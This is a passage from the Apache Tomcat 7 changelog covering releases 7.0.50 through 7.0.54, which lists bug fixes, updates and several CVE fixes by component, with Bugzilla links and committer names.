dispatching a request, ensure that a call to `HttpServletRequest.getPathTranslated()` returns a value that is based on the modified PathInfo. (markt) | | fix | [56698](https://bz.apache.org/bugzilla/show_bug.cgi?id=56698): When persisting idle sessions, only persist newly idle sessions. Patch provided by Felix Schumacher. (markt) | | fix | [56710](https://bz.apache.org/bugzilla/show_bug.cgi?id=56710): Do not map requests to servlets when context is being reloaded. (kkolinko) | | fix | [56712](https://bz.apache.org/bugzilla/show_bug.cgi?id=56712): Fix session idle time calculations in `PersistenceManager`. (kkolinko) | | fix | [56717](https://bz.apache.org/bugzilla/show_bug.cgi?id=56717): Fix duplicate registration of `MapperListener` during repeated starts of embedded Tomcat. (kkolinko) | | add | [56724](https://bz.apache.org/bugzilla/show_bug.cgi?id=56724): Write an error message to Tomcat logs if container background thread is aborted unexpectedly. (kkolinko) | |  | **Coyote** | | --- | | | fix | [56518](https://bz.apache.org/bugzilla/show_bug.cgi?id=56518): When using NIO, do not attempt to write to the socket if the thread is marked interrupted as this will lead to a connection limit leak. This fix was based on analysis of the issue by hanyong. (markt) | | --- | --- | | fix | [56521](https://bz.apache.org/bugzilla/show_bug.cgi?id=56521): Re-use the asynchronous write buffer between writes to reduce allocation and GC overhead. Based on a patch by leonzhx. Also make the buffer size configurable and remove copying of data within buffer when the buffer is only partially written on a subsequent write. (markt) | | fix | Correct a copy/paste error and return a 500 response rather than a 400 response when an internal server error occurs on early stages of request processing. (markt) | | code | [56582](https://bz.apache.org/bugzilla/show_bug.cgi?id=56582): Use switch(actionCode) in processors instead of a chain of "elseif"s. (kkolinko) | | fix | Fix CVE-2014-0227: Various improvements to ChunkedInputFilter including clean-up, i18n for error messages and adding an error flag to allow subsequent attempts at reading after an error to fail fast. (markt) | | fix | If request contains an unrecognized Expect header, respond with error 417 (Expectation Failed), according to RFC2616 chapter 14.20. (markt) | | fix | When an error occurs after the response has been committed close the connection immediately rather than attempting to finish the response to make it easier for the client to differentiate between a complete response and one that failed part way though. (markt) | | fix | [56620](https://bz.apache.org/bugzilla/show_bug.cgi?id=56620): Avoid bogus access log entries when pausing the NIO HTTP connector and ensure that access log entries generated by error conditions use the correct request start time. (markt) | | add | Fix CVE-2014-0230: Add a new limit, defaulting to 2MB, for the amount of data Tomcat will swallow for an aborted upload. The limit is configurable by `maxSwallowSize` attribute of an HTTP connector. (markt) | | update | Allow to configure `maxSwallowSize` attribute of an HTTP connector via JMX. (kkolinko) | | fix | [56661](https://bz.apache.org/bugzilla/show_bug.cgi?id=56661): Fix `getLocalAddr()` for AJP connectors. The complete fix is only available with a recent AJP forwarder like the forthcoming mod\_jk 1.2.41. (rjung) | | fix | [59451](https://bz.apache.org/bugzilla/show_bug.cgi?id=59451): Correct Javadoc for `MessageBytes`. Patch provided by Kyohei Nakamura. (markt) | |  | **Jasper** | | --- | | | fix | [56334#c15](https://bz.apache.org/bugzilla/show_bug.cgi?id=56334#c15): Fix a regression in EL parsing when quoted string follows a whitespace. (kkolinko/markt) | | --- | --- | | fix | [56543](https://bz.apache.org/bugzilla/show_bug.cgi?id=56543): Update to the Eclipse JDT Compiler 4.4. (violetagg) | | fix | [56561](https://bz.apache.org/bugzilla/show_bug.cgi?id=56561): Avoid `NoSuchElementException` while handling attributes with empty string value. (violetagg) | | update | [56581](https://bz.apache.org/bugzilla/show_bug.cgi?id=56581): If an error on a JSP page occurs when response has already been committed, do not clear the buffer of JspWriter, but flush it. It will make more clear where the error occurred. (kkolinko) | | fix | [56612](https://bz.apache.org/bugzilla/show_bug.cgi?id=56612): Correctly parse two consecutive escaped single quotes when used in UEL expression in a JSP. (markt) | | update | Move code that parses EL expressions within JSP template text from `Parser` to `JspReader` class for better performance. (kkolinko) | |  | **WebSocket** | | --- | | | fix | [56577](https://bz.apache.org/bugzilla/show_bug.cgi?id=56577): Improve the executor configuration used for the callbacks associated with asynchronous writes. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | Set the path for cookies created by the examples web application so they only returned to the examples application. This reduces the opportunity for using such cookies for malicious purposes should the advice to remove the examples web application from security sensitive systems be ignored. (markt/kkolinko) | | --- | --- | | fix | Attempt to obfuscate session cookie values associated with other web applications when viewing HTTP request headers with the Request Header example from the examples web application. This reduces the opportunity to use this example for malicious purposes should the advice to remove the examples web application from security sensitive systems be ignored. (markt) | |  | **Other** | | --- | | | update | Update optional Checkstyle library to 5.7. (kkolinko) | | --- | --- | | fix | [56685](https://bz.apache.org/bugzilla/show_bug.cgi?id=56685): Add quotes necessary for `daemon.sh` to work correctly on Solaris. Based on a suggestion by lfuka. (markt) | | update | [56596](https://bz.apache.org/bugzilla/show_bug.cgi?id=56596): Update to Tomcat Native Library version 1.1.31 to pick up the Windows binaries that are based on OpenSSL 1.0.1h. (markt) | | | |  | **Tomcat 7.0.54 (violetagg)** | **released 2014-05-22** | | --- | --- | | | **Catalina** | | --- | | | fix | Fix custom UTF-8 decoder so that a byte of value 0xC1 is always rejected immediately as it is never valid in a UTF-8 byte sequence. Update UTF-8 decoder tests to account for UTF-8 decoding improvements in Java 8. The custom UTF-8 decoder is still required due to bugs in the UTF-8 decoder provided by Java. Java 8's decoder is better than Java 7's but it is still buggy. (markt) | | --- | --- | | fix | [56027](https://bz.apache.org/bugzilla/show_bug.cgi?id=56027): Add more options for managing FIPS mode in the AprLifecycleListener. (schultz/kkolinko) | | fix | [56321](https://bz.apache.org/bugzilla/show_bug.cgi?id=56321): When a WAR is modified, undeploy the web application before deleting any expanded directory as the undeploy process may refer to classes that need to be loaded from the expanded directory. If the expanded directory is deleted first, any attempt to load a new class during undeploy will fail. (markt) | | fix | [56339](https://bz.apache.org/bugzilla/show_bug.cgi?id=56339): Avoid an infinite loop if an application calls `session.invalidate()` from the session destroyed event for that session. (markt) | | update | [56365](https://bz.apache.org/bugzilla/show_bug.cgi?id=56365): Simplify file name pattern matching code in `StandardJarScanner`. Ignore leading and trailing whitespace and empty strings when configuring patterns. Improve documentation. (kkolinko) | | fix | [56369](https://bz.apache.org/bugzilla/show_bug.cgi?id=56369): Ensure that removing an MBean notification listener reverts all the operations performed when adding an MBean notification listener. (markt) | | add | [56382](https://bz.apache.org/bugzilla/show_bug.cgi?id=56382): Information about finished deployment and its execution time is added to the log files. Patch is provided by Danila Galimov. (violetagg) | | add | [56383](https://bz.apache.org/bugzilla/show_bug.cgi?id=56383): Properties for disabling server information and error report are added to the `org.apache.catalina.valves.ErrorReportValve`. Based on the patch provided by Nick Bunn. (violetagg/kkolinko) | | fix | Fix CVE-2014-0119: Only create XML parsing objects if required and fix associated potential memory leak in the default Servlet. Extend XML factory, parser etc. memory leak protection to cover some additional locations where, theoretically, a memory leak could occur. Ensure that a TLD parser obtained from the cache has the correct value of `blockExternal`. (markt) | | fix | Modify generic exception handling so that `StackOverflowError` is not treated as a fatal error and can handled and/or logged as required. (markt) | | fix | [56409](https://bz.apache.org/bugzilla/show_bug.cgi?id=56409): Avoid `StackOverflowError` on non-Windows systems if a file named `\` is encountered when scanning for TLDs. (markt) | | add | [56430](https://bz.apache.org/bugzilla/show_bug.cgi?id=56430): Extend checks for suspicious URL patterns to include patterns of the form `*.a.b` which are not valid patterns for extension mappings. (markt) | | fix | [56441](https://bz.apache.org/bugzilla/show_bug.cgi?id=56441): Raise the visibility of exceptions thrown when a problem is encountered calling a getter or setter on a component attribute. The logging level is raised from debug to warning. (markt) | | fix | [56451](https://bz.apache.org/bugzilla/show_bug.cgi?id=56451): Make resources accessed via a context alias accessible via JNDI in the same way standard resources are available. (markt) | | add | [56463](https://bz.apache.org/bugzilla/show_bug.cgi?id=56463): Property for disabling server information is added to the `DefaultServlet`. Server information is presented in the response sent to the client when directory listings is enabled. (violetagg) | | add | Add the `org.apache.naming` package to the packages requiring code to have the `defineClassInPackage` permission when running under a security manager. (markt) | | add | Add the `org.apache.naming.resources` package to the packages requiring code to have the `accessClassInPackage` permission when running under a security manager. (markt) | | fix | Make the naming context tokens for containers more robust. Require RuntimePermission when introducing a new token. (markt/kkolinko) | | fix | [56472](https://bz.apache.org/bugzilla/show_bug.cgi?id=56472): Allow NamingContextListener to clean up on stop if its start failed. (kkolinko) | | add | [56492](https://bz.apache.org/bugzilla/show_bug.cgi?id=56492): Avoid eclipse debugger pausing on uncaught exceptions when tomcat renews its threads. (slaurent) | | fix | Minor fixes to `ThreadLocalLeakPreventionListener`. Do not trigger threads renewal for failed contexts. Do not ignore `threadRenewalDelay` setting. Improve documentation. (kkolinko) | | fix | Correct regression introduced in [r797162](https://svn.apache.org/viewvc?view=rev&rev=797162) that broke authentication of users when using the `JAASMemoryLoginModule`. (markt) | | fix | [56501](https://bz.apache.org/bugzilla/show_bug.cgi?id=56501): `HttpServletRequest.getContextPath()` should return the undecoded context path used by the user agent. (markt) | | fix | [56523](https://bz.apache.org/bugzilla/show_bug.cgi?id=56523): When using SPNEGO authentication, log the exceptions associated with failed user logins at debug level rather than error level. (markt) | | fix | [56536](https://bz.apache.org/bugzilla/show_bug.cgi?id=56536): Ensure that `HttpSessionBindingListener.valueUnbound()` uses the correct class loader when the `SingleSignOn` valve is used. (markt) | |  | **Coyote** | | --- | | | add | [56399](https://bz.apache.org/bugzilla/show_bug.cgi?id=56399): Assert that both Coyote and Catalina request objects have been properly recycled. (kkolinko) | | --- | --- | | fix | [56416](https://bz.apache.org/bugzilla/show_bug.cgi?id=56416): Correct documentation for default value of socket linger for the AJP and HTTP connectors. (markt) | |  | **Jasper** | | --- | | | fix | [56334](https://bz.apache.org/bugzilla/show_bug.cgi?id=56334): Fix a regression in the handling of back-slash escaping introduced by the fix for [55735](https://bz.apache.org/bugzilla/show_bug.cgi?id=55735). (markt/kkolinko) | | --- | --- | | fix | [56425](https://bz.apache.org/bugzilla/show_bug.cgi?id=56425): Improve method matching for EL expressions. When looking for matching methods, an exact match between parameter types is preferred followed by an assignable match followed by a coercible match. (markt) | | fix | Correct the handling of back-slash escaping in the EL parser and no longer require that `\$` or `\#` must be followed by `{` in order for the back-slash escaping to take effect. (markt) | | fix | [56529](https://bz.apache.org/bugzilla/show_bug.cgi?id=56529): Avoid `NoSuchElementException` while handling attributes with empty string value in custom tags. Patch provided by Hariprasad Manchi. (violetagg) | |  | **Cluster** | | --- | | | fix | Remove cluster and replicationValve from cluster manager template. These instance are not necessary to template. (kfujino) | | --- | --- | | fix | Add support for cross context session replication to `org.apache.catalina.ha.session.BackupManager`. (kfujino) | | fix | Remove the unnecessary cross context check. It does not matter whether the context that is referenced by other context is set to `crossContext`=true. The context that refers to the different context must be set to `crossContext`=true. (kfujino) | | code | Move to `org.apache.catalina.ha.session.ClusterManagerBase` common logics of `org.apache.catalina.ha.session.BackupManager` and `org.apache.catalina.ha.session.DeltaManager`. (kfujino) | | code | Simplify the code of `o.a.c.ha.tcp.SimpleTcpCluster`. In order to add or remove cluster valve to Container, use pipeline instead of `IntrospectionUtils`. (kfujino) | | fix | There is no need to set cluster instance when `SimpleTcpCluster.unregisterClusterValve` is called. Set null than cluster instance for cleanup. (kfujino) | | code | Backport refactoring of `AbstractReplicatedMap` to implement `Map` rather than extend `ConcurrentHashMap` to enable Tomcat 7 to be built with Java 8. (markt) | |  | **WebSocket** | | --- | | | fix | [56343](https://bz.apache.org/bugzilla/show_bug.cgi?id=56343): Avoid a NPE if Tomcat's Java WebSocket 1.0 implementation is used with the Java WebSocket 1.0 API JAR from the reference implementation. (markt) | | --- | --- | | fix | Increase the default maximum size of the executor used by the WebSocket implementation for call backs associated with asynchronous writes from 10 to 200. (markt) | | add | Add a warning if the thread group created for WebSocket asynchronous write call backs can not be destroyed when the web application is stopped. (markt) | | fix | Ensure that threads created to support WebSocket clients are stopped when no longer required. This will happen automatically for WebSocket client connections initiated by web applications but stand alone clients must call `WsWebSocketContainer.destroy()`. (markt) | | fix | [56449](https://bz.apache.org/bugzilla/show_bug.cgi?id=56449): When creating a new session, add the message handlers to the session before calling `Endpoint.onOpen()` so the message handlers are in place should the `onOpen()` method trigger the sending of any messages. (markt) | | fix | [56458](https://bz.apache.org/bugzilla/show_bug.cgi?id=56458): Report WebSocket sessions that are created over secure connections as secure rather than as not secure. (markt) | | fix | Stop threads used for secure WebSocket client connections when they are no longer required and give them better names for easier debugging while they are running. (markt) | |  | **Web applications** | | --- | | | fix | Add Support for `copyXML` attribute of Host to Host Manager. (kfujino) | | --- | --- | | fix | Ensure that "name" request parameter is used as a application base of host if "webapps" request parameter is not set when adding host in HostManager Application. (kfujino) | | fix | Correct documentation on Windows service options, aligning it with Apache Commons Daemon documentation. (kkolinko) | | update | [55215](https://bz.apache.org/bugzilla/show_bug.cgi?id=55215): Improve log4j configuration example. Clarify access logging documentation. Based on patches provided by Brian Burch. (kkolinko) | | update | [55383](https://bz.apache.org/bugzilla/show_bug.cgi?id=55383): Backport improved HTML markup for tables and code fragments from Tomcat 8 documentation. (kkolinko) | | fix | [56418](https://bz.apache.org/bugzilla/show_bug.cgi?id=56418): Ensure that the Manager web application does not report success for a web application deployment that fails. (slaurent) | | fix | Fix target and rel attributes on links in documentation. They were lost during XSLT transformation. (kkolinko) | | update | Improve valves documentation. Split valves into groups. (kkolinko) | |  | **Other** | | --- | | | fix | Align DisplayName of Tomcat installed by `service.bat` with one installed by the \*.exe installer. Print a warning in case if neither server nor client jvm is found by `service.bat`. (kkolinko) | | --- | --- | | update | [56363](https://bz.apache.org/bugzilla/show_bug.cgi?id=56363): Update to version 1.1.30 of Tomcat Native library. (schultz) | | update | Update package renamed Apache Commons BCEL to r1593495 to pick up some additional changes for Java 7 support and some code clean up. (markt) | | add | In tests: allow to configure directory where JUnit reports and access log are written to. (kkolinko) | | | |  | **Tomcat 7.0.53 (violetagg)** | **released 2014-03-30** | | --- | --- | | | **Catalina** | | --- | | | add | Make it easier for applications embedding and/or extending Tomcat to modify the `javaseClassLoader` attribute of the `WebappClassLoader`. (markt) | | --- | --- | | fix | Improve the robustness of web application undeployment based on some code analysis triggered by the report for [54315](https://bz.apache.org/bugzilla/show_bug.cgi?id=54315). (markt) | | fix | [56219](https://bz.apache.org/bugzilla/show_bug.cgi?id=56219): Improve merging process for web.xml files to take account of the elements and attributes supported by the Servlet version of the merged file. (markt) | | fix | [56190](https://bz.apache.org/bugzilla/show_bug.cgi?id=56190): The response should be closed (i.e. no further output is permitted) when a call to `AsyncContext.complete()` takes effect. (markt) | | fix | [56236](https://bz.apache.org/bugzilla/show_bug.cgi?id=56236): Enable Tomcat to work with alternative Servlet and JSP API JARs that package the XML schemas in such as way as to require a dependency on the JSP API before enabling validation for web.xml. Tomcat has no such dependency. (markt) | | fix | [56246](https://bz.apache.org/bugzilla/show_bug.cgi?id=56246): Fix NullPointerException in MemoryRealm when authenticating an unknown user. (markt) | | fix | [56248](https://bz.apache.org/bugzilla/show_bug.cgi?id=56248): Allow the deployer to update an existing WAR file without undeploying the existing application if the update flag is set. This allows any existing custom context.xml for the application to be retained. To update an application and remove any existing context.xml simply undeploy the old version of the application before deploying the new version. (markt) | | fix | Fix CVE-2014-0096: Redefine the `globalXsltFile` initialisation parameter of the DefaultServlet as relative to CATALINA\_BASE/conf or CATALINA\_HOME/conf. Prevent user supplied XSLTs used by the DefaultServlet from defining external entities. (markt) | | add | Add a work around for validating XML documents (often TLDs) that use just the file name to refer to the JavaEE schema on which they are based. (markt) | | fix | [56293](https://bz.apache.org/bugzilla/show_bug.cgi?id=56293): Cache resources loaded by the class loader from `/META-INF/services/` for better performance for repeated look ups. (markt) | |  | **Coyote** | | --- | | | fix | [53119](https://bz.apache.org/bugzilla/show_bug.cgi?id=53119): Make sure the NIO AJP output buffer is cleared on any error to prevent any possible overflow if it is written to again before the connection is closed. This extends the original fix for the APR/native output buffer to the NIO connector. (kkolinko) | | --- | --- | | fix | [56172](https://bz.apache.org/bugzilla/show_bug.cgi?id=56172): Avoid possible request corruption when using the AJP NIO connector and a request is sent using more than one AJP message. Patch provided by Amund Elstad. (markt) | | fix | [56213](https://bz.apache.org/bugzilla/show_bug.cgi?id=56213): Reduce garbage collection when the NIO connector is under heavy load. (markt) | | fix | Fix CVE-2014-0075: Improve processing of chuck size from chunked headers. Avoid overflow and use a bit shift instead of a multiplication as it is marginally faster. (markt/kkolinko) | | fix | Fix CVE-2014-0099: Fix possible overflow when parsing long values from a byte array. (markt) | |  | **Jasper** | | --- | | | fix | [54475](https://bz.apache.org/bugzilla/show_bug.cgi?id=54475): Add Java 8 support to SMAP generation for JSPs. Patch by Robbie Gibson. (markt) | | --- | --- | | fix | [55483](https://bz.apache.org/bugzilla/show_bug.cgi?id=55483): Improve handing of overloaded methods and constructors in expression language implementation. (markt) | | fix | [56208](https://bz.apache.org/bugzilla/show_bug.cgi?id=56208): Restore the validateXml option to Jasper that was previously renamed validateTld. Both options are now supported. validateXml controls the validation of web.xml files when Jasper parses them and validateTld controls the validation of \*.tld files when Jasper parses them. (markt) | | fix | [56223](https://bz.apache.org/bugzilla/show_bug.cgi?id=56223): Throw an `IllegalStateException` if a call is made to `ServletContext.setInitParameter()` after the ServletContext has been initialized. (markt) | | fix | [56265](https://bz.apache.org/bugzilla/show_bug.cgi?id=56265): Do not escape values of dynamic tag attributes containing EL expressions. (kkolinko) | | fix | Make the default compiler source and target versions for JSPs Java 6 since Tomcat 7 requires Java 6 as a minimum. (markt) | | update | [56283](https://bz.apache.org/bugzilla/show_bug.cgi?id=56283): Update to the Eclipse JDT Compiler P20140317-1600 which adds support for Java 8 syntax to JSPs. Add support for value "1.8" for the `compilerSourceVM` and `compilerTargetVM` options. (markt) | |  | **WebSocket** | | --- | | | fix | Avoid a possible deadlock when one thread is shutting down a connection while another thread is trying to write to it. (markt) | | --- | --- | | fix | Call onError if an exception is thrown calling onClose when closing a session. (remm) | |  | **Web applications** | | --- | | | code | In the documentation: add support for several documentation tags from Tomcat 8. Such as `<version-major/>`. (kkolinko) | | --- | --- | | add | [56093](https://bz.apache.org/bugzilla/show_bug.cgi?id=56093): Add the SSL Valve to the documentation web application. (markt) | | fix | [56217](https://bz.apache.org/bugzilla/show_bug.cgi?id=56217): Improve readability by using left alignment for the table cell containing the request information on the Manager application status page. (markt) | | fix | Fixed `java.lang.NegativeArraySizeException` when using "Expire sessions" command in the manager web application on a context where the session timeout is disabled. (kfujino) | | fix | Add support for `LAST_ACCESS_AT_START` system property to Manager web application. (kfujino) | | fix | Add definition of `org.apache.catalina.ant.FindLeaksTask`. (kfujino) | | fix | [56273](https://bz.apache.org/bugzilla/show_bug.cgi?id=56273): If the Manager web application does not perform an operation because the web application is already being serviced, report an error rather than reporting success. (markt) | | fix | [56304](https://bz.apache.org/bugzilla/show_bug.cgi?id=56304): Add a note to the documentation about not using WebSocket with BIO HTTP in production. (markt) | |  | **Other** | | --- | | | fix | [56143](https://bz.apache.org/bugzilla/show_bug.cgi?id=56143): Improve `service.bat` so that it can be launched from a non-UAC console. This includes using a single call to `tomcat7.exe` to install the Windows service rather than three calls, and using command line arguments instead of environment variables to pass the settings. (markt/kkolinko) | | --- | --- | | fix | Fix regression in 7.0.52: when using `service.bat install` to install the service the values for --StdOutput, --StdError options were passed as blank instead of "auto". (kkolinko) | | fix | Align options between `service.bat` and `exe` Windows installer. For `service.bat` the changes are in --Classpath, --DisplayName, --StartPath, --StopPath. For `exe` installer the changes are in --JvmMs, --JvmMx options, which are now 128 Mb and 256 Mb respectively instead of being empty. Explicitly specify --LogPath path when uninstalling Windows service, avoiding default value for that option. (kkolinko) | | code | Simplify Windows \*.bat files: remove %OS% checks, as java 6 does not run on ancient non-NT operating systems. (kkolinko) | | fix | [56137](https://bz.apache.org/bugzilla/show_bug.cgi?id=56137): Explicitly use the BIO connector in the SSL example in server.xml so it doesn't break if APR is enabled. (markt) | | fix | [56139](https://bz.apache.org/bugzilla/show_bug.cgi?id=56139): Avoid a web application class loader leak in some unit tests when running on Windows. (markt) | | fix | Correct build script to avoid building JARs with empty packages. (markt) | | add | Allow to limit JUnit test run to a number of selected test case methods. (kkolinko) | | fix | [56189](https://bz.apache.org/bugzilla/show_bug.cgi?id=56189): Remove used file cpappend.bat from the distribution. (markt) | | | |  | **Tomcat 7.0.52 (violetagg)** | **released 2014-02-17** | | --- | --- | | | **Catalina** | | --- | | | fix | Generate a valid root element for the effective web.xml for a web application for all supported versions of web.xml. (markt) | | --- | --- | |  | **Coyote** | | --- | | | code | Pull up `SocketWrapper` to `AbstractProcessor`. (markt) | | --- | --- | | fix | In some circumstances asynchronous requests could time out too soon. (markt) | | | |  | **Tomcat 7.0.51 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | [55287](https://bz.apache.org/bugzilla/show_bug.cgi?id=55287): `ServletContainerInitializer` defined in the container may not be found. (markt/jboynes) | | --- | --- | | fix | [55855](https://bz.apache.org/bugzilla/show_bug.cgi?id=55855): Provide a per Context option (containerSciFilter) to exclude container SCIs. (markt) | | fix | [55937](https://bz.apache.org/bugzilla/show_bug.cgi?id=55937): When deploying applications, treat a context path of `/ROOT` as equivalent to `/`. (markt) | | fix | [55943](https://bz.apache.org/bugzilla/show_bug.cgi?id=55943): Improve the implementation of the class loader check that prevents web applications from trying to override J2SE implementation classes. As part of this fix, refactor the way a null parent class loader is handled which enables a number of null checks and object creation calls to be removed. Note that this change means that, by default, the web application class loader is now a higher priority for loading classes than the system class loader. (markt) | | fix | [55958](https://bz.apache.org/bugzilla/show_bug.cgi?id=55958): Differentiate between `foo.war` the WAR file and `foo.war` the directory. (markt) | | fix | [55960](https://bz.apache.org/bugzilla/show_bug.cgi?id=55960): Improve the single sign on (SSO) unit tests. Patch provided by Brian Burch. (markt) | | fix | [55974](https://bz.apache.org/bugzilla/show_bug.cgi?id=55974): Retain order when reporting errors and warnings while parsing XML configuration files. (markt) | | fix | [56013](https://bz.apache.org/bugzilla/show_bug.cgi?id=56013): Fix issue with SPNEGO authentication when using IBM JREs. IBM JREs only understand the option of infinite lifetime for Kerberos credentials. Based on a patch provided by Arunav Sanyal. (markt) | | fix | [56016](https://bz.apache.org/bugzilla/show_bug.cgi?id=56016): When loading resources for XML schema validation, take account of the possibility that servlet-api.jar and jsp-api.jar may not be loaded by the same class loader. Patch by Juan Carlos Estibariz. (markt) | | fix | [56025](https://bz.apache.org/bugzilla/show_bug.cgi?id=56025): When creating a WebSocket connection, always call `ServerEndpointConfig.Configurator.getNegotiatedSubprotocol()` and always create the EndPoint instance after calling `ServerEndpointConfig.Configurator.modifyHandshake()`. (markt) | | fix | [56032](https://bz.apache.org/bugzilla/show_bug.cgi?id=56032): Ensure that the WebSocket connection is closed after an IO error or an interrupt while sending a WebSocket message. (markt) | | fix | [56042](https://bz.apache.org/bugzilla/show_bug.cgi?id=56042): If a request in async mode has an error but has already been dispatched don't generate an error page in the ErrorReportValve so the dispatch target can handle it. (markt) | | fix | Add missing `javax.annotation.sql.*` classes to annotations-api.jar. (markt) | | fix | The type of logger attribute of Context MBean should be not `org.apache.commons.logging.Log` but `org.apache.juli.logging.Log`. (kfujino) | | fix | [56082](https://bz.apache.org/bugzilla/show_bug.cgi?id=56082): Fix a concurrency bug in JULI's LogManager implementation. (markt) | | fix | [56096](https://bz.apache.org/bugzilla/show_bug.cgi?id=56096): When the attribute `rmiBindAddress` of the JMX Remote Lifecycle Listener is specified it's value will be used when constructing the address of a JMX API connector server. Patch is provided by Jim Talbut. (violetagg) | | fix | When environment entry with one and the same name is defined in the web deployment descriptor and with annotation then the one specified in the web deployment descriptor is with priority. (violetagg) | | fix | Change default value of `xmlBlockExternal` attribute of Context. It is `true` now. (kkolinko) | |  | **Coyote** | | --- | | | fix | Avoid possible NPE if a content type is specified without a character set. (markt) | | --- | --- | | fix | [55956](https://bz.apache.org/bugzilla/show_bug.cgi?id=55956): Make the forwarded remote IP address available to the Connectors via a request attribute. (markt) | | fix | [55976](https://bz.apache.org/bugzilla/show_bug.cgi?id=55976): Fix sendfile support for the HTTP NIO connector. (markt) | | fix | [55996](https://bz.apache.org/bugzilla/show_bug.cgi?id=55996): Ensure Async requests timeout correctly when using the NIO HTTP connector. (markt) | | add | [56021](https://bz.apache.org/bugzilla/show_bug.cgi?id=56021): Make it possible to use the Windows-MY key store with the BIO and NIO connectors for SSL configuration. It requires a `keystoreFile="" keystoreType="Windows-My"` to be set on the connector. Based on a patch provided by Asanka. (markt) | |  | **Jasper** | | --- | | | fix | Correct a regression in the XML refactoring that meant that errors in TLD files were swallowed. (markt) | | --- | --- | | fix | [55671](https://bz.apache.org/bugzilla/show_bug.cgi?id=55671): Correct typo in the log message for a wrong value of genStringAsCharArray init-param of JspServlet. This parameter had a different name in Tomcat 6. (kkolinko) | | fix | [55973](https://bz.apache.org/bugzilla/show_bug.cgi?id=55973): Fix processing of XML schemas when validation is enabled in Jasper. (kkolinko) | | fix | [56010](https://bz.apache.org/bugzilla/show_bug.cgi?id=56010): Don't throw an `IllegalArgumentException` when `JspFactory.getPageContext` is used with `JspWriter.DEFAULT_BUFFER`. Based on a patch by Eugene Chung. (markt) | | fix | [56012](https://bz.apache.org/bugzilla/show_bug.cgi?id=56012): When using the extends attribute of the page directive do not import the super class if it is in an unnamed package as imports from unnamed packages are now explicitly illegal. (markt) | | fix | [56029](https://bz.apache.org/bugzilla/show_bug.cgi?id=56029): A regression in the fix for [55198](https://bz.apache.org/bugzilla/show_bug.cgi?id=55198) meant that when EL containing a ternary expression was used in an attribute a compilation error would occur for some expressions. (markt) | | fix | Correct several errors in jspxml Schema and DTD. (kkolinko) | | fix | Change default value of the `blockExternal` attribute of JspC task. The default value is `true`. Add support for `-no-blockExternal` switch when JspC is run as a standalone application. (kkolinko) | |  | **Cluster** | | --- | | | code | Simplify the code of `o.a.c.ha.tcp.SimpleTcpCluster.createManager(String)`. Remove unnecessary class cast. (kfujino) | | --- | --- | |  | **WebSocket** | | --- | | | fix | Do not return an empty string for the `Sec-WebSocket-Protocol` HTTP header when no sub-protocol has been requested or no sub-protocol could be agreed as RFC6455 requires that no `Sec-WebSocket-Protocol` header is returned in this case. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | Add index.xhtml to the welcome files list for the examples web application. (kkolinko) | | --- | --- | | fix | Clarify that the connectionTimeout may also be used as the read timeout when reading a request body (if any) in the documentation web application. (markt) | | fix | Clarify the behaviour of the maxConnections attribute for a connector in the documentation web application. (markt) | | fix | [55888](https://bz.apache.org/bugzilla/show_bug.cgi?id=55888): Update the documentation web application to make it clearer that a Container may define no more than one Realm. (markt) | | fix | [55956](https://bz.apache.org/bugzilla/show_bug.cgi?id=55956): Where available, displayed the forwarded remote IP address available on the status page of the Manager web application. (markt) | | fix | Correct links to the Tomcat mailing lists in the ROOT web application. (kkolinko) | | fix | In Manager web application improve handling of file upload errors. Display a message instead of error 500 page. Simplify parts handling code, as it is known that Tomcat takes care of them when recycling a request. (kkolinko) | |  | **Extras** | | --- | | | fix | [55166](https://bz.apache.org/bugzilla/show_bug.cgi?id=55166), [56045](https://bz.apache.org/bugzilla/show_bug.cgi?id=56045): Copy the XML schemas used for validation that are packaged in jsp-api.jar to servlet-api.jar so that an embedded Tomcat instance can start without Jasper being available. This also enables validation to work without Jasper being available. (markt/kkolinko) | | --- | --- | | fix | [56039](https://bz.apache.org/bugzilla/show_bug.cgi?id=56039): Enable the JmxRemoteLifecycleListener to work over SSL. Patch by esengstrom. (markt) | |  | **Other** | | --- | | | fix | [55743](https://bz.apache.org/bugzilla/show_bug.cgi?id=55743): Enable the stop script to work when the shutdown port is disabled and a PID file is defined. This is only available on platforms that use `catalina.sh`. (markt) | | --- | --- | | fix | [55986](https://bz.apache.org/bugzilla/show_bug.cgi?id=55986): When forcing Tomcat to stop via `kill -9 $CATALINA_PID`, the `catalina.sh` script could incorrectly report that Tomcat had not yet completely stopped when it had. Based on a patch by jess. (markt) | | fix | Package correct license and notice files with embedded JARs. (markt) | | code | Remove svn keywords (such as $Id) from source files and documentation. (kkolinko) | | fix | Fix CVE-2014-0050, a denial of service with a malicious, malformed Content-Type header and multipart request processing. Fixed by merging latest code (r1565163) from Commons FileUpload. (markt) | | fix | [56115](https://bz.apache.org/bugzilla/show_bug.cgi?id=56115): Expose the `httpusecaches` property of Ant's `get` task as some users may need to change the default. Based on a suggestion by Anthony. (markt) | | | |  | **Tomcat 7.0.50 (violetagg)** | **released 2014-01-08** | | --- | --- | | | **Catalina** | | --- | | | fix | Handle the case where a `context.xml` file is added to a web application deployed from a directory. Previously the file was ignored until Tomcat was restarted. Now (assuming automatic deployment is enabled) it will trigger a redeploy of the web application. (markt) | | --- | --- | | fix | Fix string comparison in `HostConfig.setContextClass()`. (kkolinko) | | code | Streamline handling of WebSocket messages when no handler is configured for the message currently being received. (markt) | | fix | Handle the case where a WebSocket annotation configures a message size limit larger than the default permitted by Tomcat. (markt) | | fix | [55855](https://bz.apache.org/bugzilla/show_bug.cgi?id=55855): This is a partial fix that bypasses the relatively expensive check for a WebSocket upgrade request if no WebSocket endpoints have been registered. (markt) | | fix | [55905](https://bz.apache.org/bugzilla/show_bug.cgi?id=55905): Prevent a NPE when web.xml references a taglib file that does not exist. Provide better error message. (violetagg) | |  | **Coyote** | | --- | | | fix | When using the BIO connector with an internal executor, do not display a warning that the executor has not shutdown as the default configuration for BIO connectors is not to wait. This is because threads in keep-alive connections cannot be interrupted and therefore the warning was nearly always displayed. (markt) | | --- | --- | |  | **Jasper** | | --- | | | fix | JspC uses servlet context initialization parameters to pass configuration so ensure that the servlet context used supports initialization parameters. (markt) | | --- | --- | |  | **Cluster** | | --- | | | fix | In `AbstractReplicatedMap#finalize`, remove rpcChannel from channel Listener of group channel before sending `MapMessage.MSG_STOP` message. This prevents that the node that sent the `MapMessage.MSG_STOP` by normal shutdown is added to member map again by ping at heartbeat thread in the node that received the `MapMessage.MSG_STOP`. 